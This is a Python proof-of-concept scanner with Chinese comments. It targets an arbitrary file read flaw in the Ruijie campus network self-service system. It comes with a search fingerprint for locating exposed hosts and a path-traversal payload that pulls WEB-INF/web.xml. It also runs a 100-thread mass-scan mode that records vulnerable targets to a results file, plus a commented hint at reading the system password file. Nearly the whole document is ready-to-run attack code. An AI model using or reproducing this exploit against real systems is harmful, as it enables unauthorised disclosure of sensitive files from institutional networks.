#锐捷校园网自助服务系统/selfservice/selfservice/module/scgroup/web/login_judge.jsf接口处存在任意文件读取漏洞，经过分析和研判，该漏洞利用难度低，可导致敏感信息泄漏，建议尽快修复。
#body="校园网自助服务系统"
import requests,re,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    @author:           🐖sawa🐇
                                    @version:          1.0.0
                                    For:               锐捷校园网自助服务系统任意文件读取漏洞
                                    Vulnerability ID:  XVE-2024-2116                        ░                                                     
"""
    print(banner)
def main():
    banner()#调用
    parser = argparse.ArgumentParser(description="this is a 锐捷校园网自助服务系统任意文件读取漏洞 ")#实例化
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')#添加参数
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)#多线程
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = '/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F'
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=5)
        # match = re.search(r'^root:',res.text)#正则匹配
        if res.status_code == 200 and '<?xml' in res.text:
            print(f"{BLUE}[+]该{target}存在漏洞{RESET}")
            with open('result.txt','a',encoding='utf-8') as fp:
                 fp.write(target+"\n")
        else:
            print(f"[-]该{target}不存在漏洞")
    except Exception as e:#异常处理
        print(f"[*]该url存在问题{target},请手动测试",e)

if __name__ == '__main__':
    main()